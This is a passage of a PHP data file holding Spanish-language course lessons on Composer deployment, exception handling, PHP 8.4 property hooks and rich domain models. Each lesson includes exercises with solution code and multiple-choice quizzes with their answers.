                            'Al correr composer update en producción, se actualizan otras 40 dependencias de forma no probada, introduciendo breaking changes silenciosos.',
                            'El autoloader queda en modo dinámico no optimizado, ralentizando cada petición.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Fija una versión semántica estricta (ej. ^3.2.0), prueba la compatibilidad localmente, corre composer audit, comitea el composer.lock generado y en el pipeline de producción ejecuta composer install --no-dev --optimize-autoloader --classmap-authoritative.',
                        'rationale' => [
                            'Despliegue 100% determinista y reproducible: cada servidor instala exactamente los mismos bits.',
                            'Cero riesgo de vulnerabilidades conocidas sin auditar.',
                            'Rendimiento máximo de autoloading mediante classmaps en memoria.',
                        ],
                        'trade_offs' => 'Requiere disciplina de equipo para actualizar dependencias de forma programada y controlada en ramas de mantenimiento.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Resolver Rutas PSR-4 sin Acceso a Disco',
                    'objective' => 'Implementar un algoritmo de resolución de clases PSR-4 que mapee un FQCN a una ruta de archivo relativa.',
                    'instructions' => 'Completa el método resolveFilePath() para transformar namespaces en rutas según la especificación oficial PSR-4.',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nclass Psr4Resolver\n{\n    /**\n     * @param array<string, string> \$prefixMap Mapeo de prefijo a directorio base (ej. ['App\\\\' => 'src/'])\n     */\n    public function __construct(private readonly array \$prefixMap) {}\n\n    public function resolveFilePath(string \$className): ?string\n    {\n        // TODO: Encuentra el prefijo coincidente, reemplaza backslashes por barras y añade .php\n        return null;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nclass Psr4Resolver\n{\n    /**\n     * @param array<string, string> \$prefixMap\n     */\n    public function __construct(private readonly array \$prefixMap) {}\n\n    public function resolveFilePath(string \$className): ?string\n    {\n        foreach (\$this->prefixMap as \$prefix => \$baseDir) {\n            if (str_starts_with(\$className, \$prefix)) {\n                \$relativeClass = substr(\$className, strlen(\$prefix));\n                \$file = \$baseDir . str_replace('\\\\', '/', \$relativeClass) . '.php';\n                \n                return \$file;\n            }\n        }\n\n        return null;\n    }\n}\n",
                    'explanation' => 'PSR-4 estipula que el prefijo del namespace se reemplaza por el directorio base correspondiente, y el resto del sub-namespace se traduce reemplazando las barras invertidas por el separador de directorios del sistema.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: PSR-4, Namespaces y Composer',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué hace exactamente el flag `--classmap-authoritative` (-a) en `composer dump-autoload`?',
                            'options' => [
                                'a' => 'Obliga a que todas las clases tengan una licencia Open Source.',
                                'b' => 'Le indica al autoloader que el classmap generado es la única fuente de verdad; si una clase no está en el mapa, Composer NO buscará en el disco, eliminando llamadas I/O.',
                                'c' => 'Elimina las dependencias de desarrollo de la carpeta vendor.',
                                'd' => 'Genera documentación técnica en formato Markdown.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'En modo authoritative, el ClassLoader confía ciegamente en la tabla hash en memoria. Si un atacante intenta explotar una clase inexistente, PHP no pierde tiempo explorando el disco.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué es una mala práctica comitear la carpeta `vendor/` en Git en un proyecto empresarial?',
                            'options' => [
                                'a' => 'Porque Git no soporta archivos PHP.',
                                'b' => 'Porque ensucia el historial de Git con millones de líneas de código ajeno, ralentiza los clones y oculta los verdaderos diffs del equipo; composer.lock es suficiente para reproducibilidad.',
                                'c' => 'Porque las librerías pierden su garantía legal si se suben a Git.',
                                'd' => 'Porque Symfony no arranca si vendor está versionado.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'vendor/ contiene código externo empaquetado. Con composer.lock fijando cada hash criptográfico, cualquier máquina puede reconstruir el directorio vendor/ idéntico con composer install.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué problema fundamental resuelve el estándar PSR-7 en el ecosistema PHP?',
                            'options' => [
                                'a' => 'Define interfaces orientadas a objetos inmutables para representar Peticiones (Request) y Respuestas (Response) HTTP, desacoplándolas de las superglobales de PHP.',
                                'b' => 'Define el formato de compresión de imágenes WebP.',
                                'c' => 'Estandariza los nombres de las tablas en MySQL.',
                                'd' => 'Obliga a usar el framework Laravel.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'PSR-7 eleva el protocolo HTTP a objetos fuertemente tipados e inmutables (MessageInterface, RequestInterface, ResponseInterface), permitiendo middleware reutilizables entre frameworks.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // LECCIÓN 5: Manejo de Errores & Excepciones
            // ==========================================
            'php-error-handling-exceptions' => [
                'slug' => 'php-error-handling-exceptions',
                'title' => 'Manejo Robusto de Errores & Excepciones',
                'module' => 'PHP Moderno',
                'minutes' => 40,
                'difficulty' => 'Intermedio',
                'overview' => [
                    'concept' => 'En PHP moderno, todos los errores del lenguaje y fallos de ejecución implementan la interfaz Throwable. Esta jerarquía se divide en dos ramas fundamentales: Error (errores de tipado, sintaxis o memoria del motor) y Exception (condiciones excepcionales controladas por la aplicación).',
                    'problem' => 'Ignorar errores con el operador de supresión @, capturar catch(\\Exception $e) genéricos y silenciarlos, o mostrar stack traces con contraseñas de base de datos a los usuarios finales provoca vulnerabilidades de seguridad y pesadillas de depuración.',
                    'solution' => 'Diseñar una jerarquía limpia de Excepciones de Dominio (Domain Exceptions), usar tipado estricto para que los fallos sean inmediatos (Fail-Fast) y capturar excepciones no controladas mediante manejadores globales centralizados con Monolog.',
                ],
                'internals' => [
                    'title' => 'La Jerarquía Throwable en el Zend Engine',
                    'steps' => [
                        [
                            'phase' => '1. La Interfaz Throwable',
                            'description' => 'No puedes implementar Throwable directamente en clases de usuario; debes heredar de Exception o Error. Garantiza métodos consistentes: getMessage(), getCode(), getFile(), getLine(), getTrace(), getPrevious().',
                        ],
                        [
                            'phase' => '2. Error vs Exception',
                            'description' => 'Error representa fallos fatales del motor: TypeError (violación de tipos), ParseError (código inválido), ArithmeticError / DivisionByZeroError. Exception representa situaciones excepcionales de la lógica de negocio.',
                        ],
                        [
                            'phase' => '3. Exception Chaining ($previous)',
                            'description' => 'Un Senior nunca pierde la causa raíz: cuando captura una PDOException de bajo nivel, la envuelve en una OrderPersistenceFailedException de dominio y pasa la excepción original como tercer argumento ($previous) para preservar el stack trace completo.',
                        ],
                        [
                            'phase' => '4. Global Error Handling en Symfony',
                            'description' => 'El componente ErrorHandler de Symfony convierte automáticamente notices y warnings de PHP en ErrorException, atrapando todo a través del evento kernel.exception para emitir respuestas JSON estándar (RFC 7807 Problem Details).',
                        ],
                    ],
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior aplica la filosofía "Fail Fast, Fail Loud, Log Contextually". Si un parámetro de dominio es inválido, lanza una excepción en el constructor inmediatamente; nunca permite que un objeto inconsistente viaje por la aplicación. Y jamás usa excepciones para control de flujo habitual (como verificar si un usuario existe).',
                    'critical_questions' => [
                        '¿Estamos ocultando trazas de error en producción para no filtrar rutas del servidor o credenciales en respuestas HTTP?',
                        '¿Nuestras excepciones de dominio son semánticas (ej. InsufficientFundsException) o estamos arrojando RuntimeException("No hay saldo") genéricas?',
                        '¿Estamos registrando contexto estructurado en los logs (User ID, IP, Order ID, Correlation ID) para poder rastrear el incidente en Datadog o CloudWatch?',
                        '¿Por qué el operador @ de supresión de errores está terminantemente prohibido en bases de código profesionales?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Cobrar una tarjeta de crédito en una pasarela de pago que puede fallar por falta de fondos o por caída del servicio externo.',
                    'junior' => [
                        'approach' => 'Envuelve la llamada en try { ... } catch (\\Exception $e) { return false; }. Si falla, retorna false silenciosamente sin registrar la razón ni el error.',
                        'flaws' => [
                            'El usuario no sabe si su tarjeta fue declinada, si no tiene saldo o si la pasarela se cayó.',
                            'El equipo de soporte no tiene forma de saber por qué fallaron 500 pagos en la última hora porque no hay logs.',
                            'Capturar \\Exception oculta errores de programación graves (como TypeErrors en métodos internos).',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Define excepciones tipadas: CardDeclinedException (error del cliente, HTTP 402) y PaymentGatewayUnavailableException (error de infraestructura, HTTP 503). Registra el fallo con correlation_id en Monolog y traduce cada excepción en una respuesta RFC 7807.',
                        'rationale' => [
                            'El cliente recibe un mensaje claro de negocio.',
                            'El equipo de SRE/DevOps recibe alertas automáticas de caída de la pasarela.',
                            'La causa original queda preservada mediante encadenamiento de excepciones ($previous).',
                        ],
                        'trade_offs' => 'Requiere crear clases de excepción especializadas, pero reduce el tiempo medio de resolución de incidentes (MTTR) de horas a minutos.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Jerarquía Semántica de Excepciones de Dominio',
                    'objective' => 'Crear una excepción de dominio para saldo insuficiente que encapsule el monto faltante y encadene el fallo previo.',
                    'instructions' => 'Implementa InsufficientFundsException extendiendo de DomainException y proveyendo métodos auxiliares para inspeccionar la cantidad requerida.',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse DomainException;\nuse Throwable;\n\nclass InsufficientFundsException extends DomainException\n{\n    // TODO: Implementa constructor tipado que reciba monto actual, monto requerido y \$previous opcional\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse DomainException;\nuse Throwable;\n\nclass InsufficientFundsException extends DomainException\n{\n    public function __construct(\n        public readonly float \$currentBalance,\n        public readonly float \$requiredAmount,\n        ?Throwable \$previous = null\n    ) {\n        \$deficit = \$this->requiredAmount - \$this->currentBalance;\n        \$message = sprintf(\n            'Fondos insuficientes. Saldo actual: %.2f, Requerido: %.2f (Faltante: %.2f)',\n            \$this->currentBalance,\n            \$this->requiredAmount,\n            \$deficit\n        );\n\n        parent::__construct(\$message, 402, \$previous);\n    }\n}\n",
                    'explanation' => 'Al usar propiedades públicas de solo lectura (public readonly) en la excepción, los controladores o suscriptores de eventos pueden inspeccionar los números numéricos exactos sin tener que parsear el string del mensaje.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Throwable, Error y Manejo de Fallos',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => 'Si un método espera un entero `int` y recibe una cadena `"texto"` con `declare(strict_types=1);`, ¿qué tipo de objeto arroja PHP?',
                            'options' => [
                                'a' => 'TypeError (que hereda directamente de Error, no de Exception).',
                                'b' => 'InvalidArgumentException.',
                                'c' => 'Un warning en el log sin detener la ejecución.',
                                'd' => 'BadMethodCallException.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Con strict_types=1, las violaciones de tipo disparan un TypeError nativo. Si tu bloque catch solo escucha catch(\\Exception $e), el TypeError se escapará y provocará un error 500 no capturado.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué es fundamental utilizar el parámetro `$previous` al relanzar una excepción de dominio?',
                            'options' => [
                                'a' => 'Para que el Garbage Collector libere la excepción anterior.',
                                'b' => 'Para encadenar excepciones (Exception Chaining), permitiendo a los desarrolladores ver la causa raíz y el stack trace original completo en los logs de producción.',
                                'c' => 'Para obligar a PHP a reiniciar la transacción de base de datos.',
                                'd' => 'Es un requisito obligatorio de la especificación PSR-4.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Sin $previous, el stack trace original se pierde y solo ves dónde relanzaste la nueva excepción, dificultando rastrear el error original que detonó el problema.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué el operador de supresión de errores `@` (ej. `@file_get_contents(...)`) es considerado un grave code smell en código Senior?',
                            'options' => [
                                'a' => 'Porque silencia errores críticos, oculta fallos de seguridad, destruye la trazabilidad en logs y degrada el rendimiento de PHP al alterar el error_reporting en tiempo de ejecución.',
                                'b' => 'Porque desinstala extensiones de PHP.',
                                'c' => 'Porque solo funciona en PHP 5.',
                                'd' => 'Porque obliga a usar arrays en lugar de objetos.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'El operador @ oculta bugs que deberían ser manejados explícitamente mediante excepciones o comprobaciones defensivas, y tiene una penalización de rendimiento interna en el Zend Engine.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // LECCIÓN 6: Features Modernas de PHP 8.4
            // ==========================================
            'php-modern-features-84' => [
                'slug' => 'php-modern-features-84',
                'title' => 'PHP 8.4: Property Hooks & Asymmetric Visibility',
                'module' => 'PHP Moderno',
                'minutes' => 50,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'PHP 8.4 marca una de las evoluciones más significativas en modelado orientado a objetos con la introducción de Property Hooks (ganchos get/set en propiedades) y Visibilidad Asimétrica (public private(set)), permitiendo diseñar objetos de dominio expresivos, seguros y con cero código basura.',
                    'problem' => 'Durante décadas, los desarrolladores de PHP escribieron miles de líneas de getters y setters redundantes (boilerplate) solo para validar invariantes o proteger la mutación externa de propiedades.',
                    'solution' => 'Con Property Hooks y visibilidad asimétrica, puedes declarar propiedades públicas para lectura pero de mutación exclusivamente interna (private(set)), integrando lógica de validación o transformación directamente en la propiedad.',
                ],
                'internals' => [
                    'title' => 'Mecánica de Property Hooks y Visibilidad en el Zend Engine',
                    'steps' => [
                        [
                            'phase' => '1. Virtual vs Backed Properties',
                            'description' => 'Un Property Hook puede ser virtual (no almacena valor en el zval, solo calcula dinámicamente como un getter) o backed (asociado a la variable interna $this->propiedad con la pseudovariable $value).',
                        ],
                        [
                            'phase' => '2. Interceptación en Opcode ZEND_FETCH_OBJ_R / ZEND_ASSIGN_OBJ',
                            'description' => 'Cuando se accede a $user->fullName, el Zend Engine detecta el gancho en tiempo de compilación y emite una invocación directa optimizada sin sobrecarga de __get() mágico dinámico.',
                        ],
                        [
                            'phase' => '3. Visibilidad Asimétrica en la Tabla de Clases',
                            'description' => 'public private(set) registra permisos diferenciados en zend_property_info: acceso público de lectura y scope restringido a la clase para la escritura.',
                        ],
                        [
                            'phase' => '4. Nuevas Funciones de Array en C (array_find, array_all)',
                            'description' => 'PHP 8.4 añade funciones nativas de búsqueda en arrays implementadas en C de alto rendimiento, evitando bucles foreach y reduciendo el overhead de closures.',
                        ],
                    ],
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior abraza las novedades de PHP 8.4 con criterio: sabe que Property Hooks son ideales para validación de invariantes de bajo nivel (como sanitizar un email o redondear una moneda), pero se cuida de no meter lógica de negocio compleja (como consultas a base de datos o llamadas de red) dentro de un hook, porque violaría el Principio de Responsabilidad Única (SRP).',
                    'critical_questions' => [
                        '¿Estamos usando visibilidad asimétrica (public private(set)) en nuestros DTOs y Entidades para garantizar encapsulación sin escribir getters estériles?',
                        '¿Este property hook realiza efectos secundarios ocultos (Side Effects) que sorprenderán a otros desarrolladores del equipo?',
                        '¿Podemos reemplazar bucles foreach lentos por array_find() o array_any() nativos de PHP 8.4?',
                        '¿Está el equipo al tanto de las deprecaciones de PHP 8.4 (como pasar null a parámetros tipados sin ?) para evitar sorpresas en futuras actualizaciones?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Diseñar una entidad UserProfile donde el nombre debe guardarse siempre con la primera letra en mayúscula y el email no puede ser modificado desde fuera de la clase tras su creación.',
                    'junior' => [
                        'approach' => 'Usa propiedades privadas tradicionales con 4 métodos getFirstName(), setFirstName(), getEmail(), setEmail(), y copia y pega validaciones en cada setter.',
                        'flaws' => [
                            '60 líneas de código repetitivo e innecesario para 2 campos.',
                            'Cualquier desarrollador puede llamar a setEmail() desde fuera y mutar un estado que debería ser inmutable.',
                            'Dificulta la lectura de la intención real del modelo.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Utiliza PHP 8.4 Property Hooks y visibilidad asimétrica en una clase concisa y elegante.',
                        'rationale' => [
                            'Lectura natural directa ($profile->name) protegida contra mutación externa.',
                            'Validación garantizada en el hook sin crear boilerplate redundante.',
                            'Código un 70% más corto, limpio y fácil de mantener.',
                        ],
                        'trade_offs' => 'Requiere que todo el entorno de ejecución y servidores corran PHP 8.4+ (lo cual es nuestro estándar).',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Modelado de Dominio con PHP 8.4 Moderno',
                    'objective' => 'Implementar una clase BankAccount con visibilidad asimétrica y property hooks que impida saldos negativos.',
                    'instructions' => 'Define la propiedad balance como de lectura pública y mutación privada con validación en el hook.',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nclass BankAccount\n{\n    // TODO: Implementa una cuenta con balance protegido y método deposit(float \$amount)\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nclass BankAccount\n{\n    public private(set) float \$balance = 0.0 {\n        set {\n            if (\$value < 0.0) {\n                throw new \\InvalidArgumentException('El saldo no puede ser negativo');\n            }\n            \$this->balance = \$value;\n        }\n    }\n\n    public function __construct(float \$initialBalance = 0.0)\n    {\n        \$this->balance = \$initialBalance;\n    }\n\n    public function deposit(float \$amount): void\n    {\n        if (\$amount <= 0.0) {\n            throw new \\InvalidArgumentException('El depósito debe ser positivo');\n        }\n        \$this->balance += \$amount;\n    }\n}\n",
                    'explanation' => 'La combinación de public private(set) con Property Hooks en PHP 8.4 garantiza que el saldo sea legible por cualquiera pero solo modificable mediante métodos de la clase, validando invariantes en tiempo de asignación.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: PHP 8.4 y Técnicas Modernas',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué significa la declaración de visibilidad `public private(set) string $email;` en PHP 8.4?',
                            'options' => [
                                'a' => 'Que la propiedad es privada los fines de semana.',
                                'b' => 'Visibilidad Asimétrica: cualquier código externo puede LEER la propiedad ($obj->email), pero solo los métodos dentro de la clase pueden MODIFICARLA.',
                                'c' => 'Que la propiedad se almacena cifrada en la base de datos.',
                                'd' => 'Que genera un getter y un setter automático en el disco.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'La visibilidad asimétrica permite lectura pública directa sin necesidad de escribir un método getEmail() vacío, mientras restringe las mutaciones al ámbito privado de la clase.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es la diferencia entre un Property Hook "Virtual" y uno "Backed" en PHP 8.4?',
                            'options' => [
                                'a' => 'Los ganchos backed no existen en PHP.',
                                'b' => 'Un hook virtual no ocupa memoria ni almacena un valor propio (se calcula en el momento, como un getter calculado); un hook backed sí almacena y muta el valor subyacente de la propiedad.',
                                'c' => 'Los hooks virtuales solo funcionan con arrays.',
                                'd' => 'Los hooks backed requieren una base de datos MySQL activa.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Un gancho virtual no tiene zval de respaldo; calcula el valor al vuelo (ej. $fullName { get => "$this->first $this->last"; }). Un gancho backed intercepta y almacena el valor en la propiedad.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué nueva función nativa en C añade PHP 8.4 para buscar el primer elemento de un array que cumpla una condición?',
                            'options' => [
                                'a' => 'array_find()',
                                'b' => 'array_search_deep()',
                                'c' => 'find_in_collection()',
                                'd' => 'query_array()',
                            ],
                            'correct' => 'a',
                            'explanation' => 'PHP 8.4 introdujo array_find(), array_find_key(), array_any() y array_all(), ofreciendo utilidades funcionales nativas de alto rendimiento en C.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 2: POO & MODELADO AVANZADO
            // LECCIÓN 1: Encapsulación & Protección de Invariantes
            // ==========================================
            'poo-encapsulation-invariants' => [
                'slug' => 'poo-encapsulation-invariants',
                'title' => 'Encapsulación & Protección de Invariantes',
                'module' => 'POO & Modelado',
                'minutes' => 40,
                'difficulty' => 'Intermedio',
                'overview' => [
                    'concept' => 'La verdadera encapsulación en la Programación Orientada a Objetos no consiste en ocultar propiedades con private para exponerles getters y setters públicos de inmediato. La encapsulación consiste en garantizar que un objeto mantenga en todo momento sus invariantes de negocio (reglas que deben cumplirse durante todo el ciclo de vida de la entidad) y que jamás pueda existir en memoria en un estado corrupto o inconsistente.',
                    'problem' => 'En los denominados "Modelos de Dominio Anémicos" (Anemic Domain Model), las entidades son meras estructuras de datos pasivas llenas de getters y setters. La lógica de negocio y las validaciones terminan dispersas en controladores, servicios, comandos de consola y formularios. Si tres partes del código modifican el saldo de una cuenta o el estado de un pedido, cualquiera puede cometer un error, omitir una validación y dejar la base de datos corrupta.',
                    'solution' => 'El "Modelo de Dominio Rico" (Rich Domain Model) exige constructores cerrados o constructores nombrados (Named Constructors como BankAccount::open(...)), propiedades protegidas o de visibilidad asimétrica, y métodos de comportamiento que reflejen el Lenguaje Ubicuo del negocio ($account->withdraw(Money $amount)). El objeto se autoprotege lanzando excepciones de dominio (DomainException) ante cualquier intento de violar una invariante.',
                    'problem_label' => 'El Problema del Modelo de Dominio Anémico:',
                    'solution_label' => 'La Solución: Modelo Rico y Auto-protegido:',
                ],
                'internals' => [
                    'title' => 'Mecánica Interna de las Invariantes y Modelos Ricos',
                    'steps' => [
                        [
                            'phase' => '1. Invariantes en el Constructor',
                            'description' => 'Un objeto jamás nace corrupto. Si una entidad requiere un titular válido y un límite de crédito para existir, el constructor o método de fábrica valida estas precondiciones antes de asignar la memoria. Si la validación falla, se lanza una DomainException y la instancia jamás llega a existir.',
                        ],
                        [
                            'phase' => '2. Tell, Don\'t Ask (Dile al objeto, no le preguntes)',
                            'description' => 'En lugar de extraer el saldo con $account->getBalance(), restar en el controlador y hacer $account->setBalance($nuevo), le ordenas $account->withdraw($monto). El objeto es dueño absoluto de sus datos y su lógica interna.',
                        ],
                        [
                            'phase' => '3. Constructores Nombrados (Named Constructors)',
                            'description' => 'Métodos estáticos expresivos (BankAccount::open(...), BankAccount::reconstituteFromPersistence(...)) comunican intención y protegen diferentes caminos de instanciación sin comprometer la encapsulación.',
                        ],
                        [
                            'phase' => '4. Excepciones Semánticas del Dominio',
                            'description' => 'En lugar de arrojar excepciones genéricas (\Exception o \InvalidArgumentException), se definen excepciones semánticas tipadas (InsufficientFundsException, AccountFrozenException) que transportan el contexto exacto del error.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Domain/Model/BankAccount.php',
                    'title' => 'Entidad Rica con Invariantes Blindadas',
                    'tag' => 'DDD Rich Domain Model',
                    'code' => "declare(strict_types=1);

namespace App\Domain\Model;

use DomainException;
use InvalidArgumentException;

class BankAccount
{
    private function __construct(
        public readonly string \$accountNumber,
        private int \$balanceCents,
        private readonly int \$overdraftLimitCents,
        private bool \$isFrozen = false
    ) {}

    public static function open(string \$accountNumber, int \$initialDepositCents, int \$overdraftLimitCents = 0): self
    {
        if (\$initialDepositCents < 0) {
            throw new InvalidArgumentException('El depósito inicial no puede ser negativo.');
        }
        if (\$overdraftLimitCents < 0) {
            throw new InvalidArgumentException('El límite de sobregiro no puede ser negativo.');
        }

        return new self(\$accountNumber, \$initialDepositCents, \$overdraftLimitCents);
    }

    public function deposit(int \$cents): void
    {
        \$this->assertNotFrozen();
        if (\$cents <= 0) {
            throw new InvalidArgumentException('El monto a depositar debe ser mayor a cero.');
        }
        \$this->balanceCents += \$cents;
    }

    public function withdraw(int \$cents): void
    {
        \$this->assertNotFrozen();
        if (\$cents <= 0) {
            throw new InvalidArgumentException('El monto a retirar debe ser mayor a cero.');
        }

        \$availableBalance = \$this->balanceCents + \$this->overdraftLimitCents;
        if (\$cents > \$availableBalance) {
            throw new DomainException(sprintf(
                'Fondos insuficientes. Saldo disponible (incluyendo sobregiro): %d centavos. Retiro solicitado: %d centavos.',
                \$availableBalance,
                \$cents
            ));
        }

        \$this->balanceCents -= \$cents;
    }

    public function getBalanceCents(): int
    {
        return \$this->balanceCents;
    }

    private function assertNotFrozen(): void
    {
        if (\$this->isFrozen) {
            throw new DomainException('La cuenta bancaria se encuentra congelada para operaciones.');
        }
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior detecta el código procedural disfrazado de POO. Si revisa un Pull Request y ve una clase con 15 propiedades y 15 getters y 15 setters, sabe que no hay encapsulación: cualquiera puede hacer $order->setStatus("DELIVERED") sin haber cobrado ni despachado el paquete. El Senior pregunta: ¿Cuáles son las invariantes del negocio? ¿Por qué permitimos modificar este estado sin una transición de negocio formal?',
                    'critical_questions' => [
                        '¿Puede este objeto existir en algún momento en un estado inválido según las reglas de negocio?',
                        '¿Estamos usando getters y setters como si fuera un DTO en lugar de dotar de comportamiento a la entidad?',
                        '¿Nuestras excepciones son semánticas del dominio (DomainException) o son excepciones técnicas genéricas?',
                        '¿Cómo gestionamos la reconstitución desde Doctrine sin disparar eventos de dominio falsos ni violar el constructor?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Implementar el retiro de fondos de una cuenta bancaria con saldo mínimo y límite de sobregiro.',
                    'junior' => [
                        'approach' => 'Crea una entidad con getters y setters para todas las propiedades ($balance, $overdraftLimit). En el Controller extrae el balance con getBalance(), calcula la resta con if ($balance - $monto < $limite) { ... }, llama a setBalance() y persiste con Doctrine.',
                        'flaws' => [
                            'La lógica de negocio está acoplada al controlador HTTP; si mañana se realiza un débito desde una API REST, un comando CLI o un webhook, la lógica debe duplicarse.',
                            'Cualquier desarrollador puede llamar a $account->setBalance(-99999) en cualquier lugar del código sin ninguna validación.',
                            'Uso de números flotantes (float) que causan errores de aproximación monetaria en centavos.',
                            'Cero auditoría y ausencia de eventos de dominio.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Diseña un Rich Domain Model donde el saldo es inmutable desde el exterior. El método $account->withdraw(int $cents) valida que la cuenta esté activa, que el monto sea positivo, que no exceda el sobregiro permitido, muta el estado interno de forma atómica y salvaguarda las invariantes.',
                        'rationale' => [
                            'Encapsulación infranqueable: es físicamente imposible retirar fondos violando las reglas del negocio, sin importar el punto de entrada.',
                            'Código autovalidante alineado con el Lenguaje Ubicuo del negocio.',
                            'Testeable al 100% mediante pruebas unitarias puras en memoria sin necesidad de levantar Symfony ni MySQL.',
                        ],
                        'trade_offs' => 'Requiere mapear cuidadosamente la hidratación con Doctrine ORM (utilizando reflexión o constructores de reconstitución) y exige un cambio de mentalidad frente al típico CRUD pasivo.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Entidad Rica con Invariantes Blindadas',
                    'objective' => 'Implementar una clase BankAccount en PHP 8.4 que proteja sus invariantes: depósito positivo, retiros dentro del límite de sobregiro y excepciones de dominio semánticas.',
                    'instructions' => 'Implementa BankAccount asegurando declare(strict_types=1);, constructor nombrado open(), métodos deposit() y withdraw(), y validación de sobregiro lanzando \DomainException cuando se intente retirar más de lo permitido.',
                    'filename' => 'BankAccount.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse DomainException;\nuse InvalidArgumentException;\n\nclass BankAccount\n{\n    private function __construct(\n        public readonly string \$accountNumber,\n        private int \$balanceCents,\n        private readonly int \$overdraftLimitCents\n    ) {}\n\n    public static function open(string \$accountNumber, int \$initialDepositCents, int \$overdraftLimitCents = 0): self\n    {\n        // TODO: Validar que el depósito inicial y sobregiro no sean negativos e instanciar la cuenta\n    }\n\n    public function deposit(int \$cents): void\n    {\n        // TODO: Validar que \$cents sea mayor a 0 y sumar al balance\n    }\n\n    public function withdraw(int \$cents): void\n    {\n        // TODO: Validar fondos suficientes considerando sobregiro. Lanzar DomainException si excede el límite permitido\n    }\n\n    public function getBalanceCents(): int\n    {\n        return \$this->balanceCents;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse DomainException;\nuse InvalidArgumentException;\n\nclass BankAccount\n{\n    private function __construct(\n        public readonly string \$accountNumber,\n        private int \$balanceCents,\n        private readonly int \$overdraftLimitCents\n    ) {}\n\n    public static function open(string \$accountNumber, int \$initialDepositCents, int \$overdraftLimitCents = 0): self\n    {\n        if (\$initialDepositCents < 0) {\n            throw new InvalidArgumentException('El depósito inicial no puede ser negativo.');\n        }\n        if (\$overdraftLimitCents < 0) {\n            throw new InvalidArgumentException('El límite de sobregiro no puede ser negativo.');\n        }\n\n        return new self(\$accountNumber, \$initialDepositCents, \$overdraftLimitCents);\n    }\n\n    public function deposit(int \$cents): void\n    {\n        if (\$cents <= 0) {\n            throw new InvalidArgumentException('El depósito debe ser mayor a 0.');\n        }\n        \$this->balanceCents += \$cents;\n    }\n\n    public function withdraw(int \$cents): void\n    {\n        if (\$cents <= 0) {\n            throw new InvalidArgumentException('El retiro debe ser mayor a 0.');\n        }\n\n        \$maxAllowed = \$this->balanceCents + \$this->overdraftLimitCents;\n        if (\$cents > \$maxAllowed) {\n            throw new DomainException('Fondos insuficientes considerando el límite de sobregiro.');\n        }\n\n        \$this->balanceCents -= \$cents;\n    }\n\n    public function getBalanceCents(): int\n    {\n        return \$this->balanceCents;\n    }\n}\n",
                    'explanation' => 'Un modelo de dominio rico nunca expone un setter setBalance(). Las mutaciones ocurren únicamente a través de métodos de intención semántica (deposit, withdraw) que validan precondiciones e invariantes antes de alterar el estado.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Encapsulación & Invariantes en POO',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la principal debilidad de un "Modelo de Dominio Anémico" (Anemic Domain Model)?',
                            'options' => [
                                'a' => 'Que consume el triple de memoria RAM en el Zend Engine.',
                                'b' => 'Que las entidades son sacos pasivos de datos sin lógica; las validaciones e invariantes quedan dispersas en controladores y servicios, facilitando estados inconsistentes.',
                                'c' => 'Que Doctrine no puede persistir clases que tengan métodos getter.',
                                'd' => 'Que no es compatible con PHP 8.4.',
                            ],
                            'correct' => 'b',
